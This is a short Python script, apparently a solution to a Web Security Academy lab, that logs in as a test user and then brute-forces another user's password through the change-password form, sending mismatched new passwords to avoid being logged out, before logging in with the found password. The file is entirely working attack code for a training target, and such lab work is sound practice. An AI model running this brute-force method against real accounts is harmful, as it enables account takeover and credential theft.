import requests

URL = "https://0a2b004f031a7bd6833696da001e00c0.web-security-academy.net/"
session = requests.session()

# Log in as wiener to create a session
data = {"username": "wiener", "password": "peter"}
session.post(URL + "login", data=data)

# Brute force carlos password using two different new passwords to avoid logout
data = {"username": "carlos", "new-password-1": "1", "new-password-2": "2"}
with open("passwords.txt") as f:
    for line in f:
        password = line.strip()
        data["current-password"] = password
        r = session.post(URL + "my-account/change-password", data=data)
        if "Current password is incorrect" not in r.text:
            print(f"Password is: {password}")
            data = {"username": "carlos", "password": password}
            requests.post(URL + "login", data=data)
            break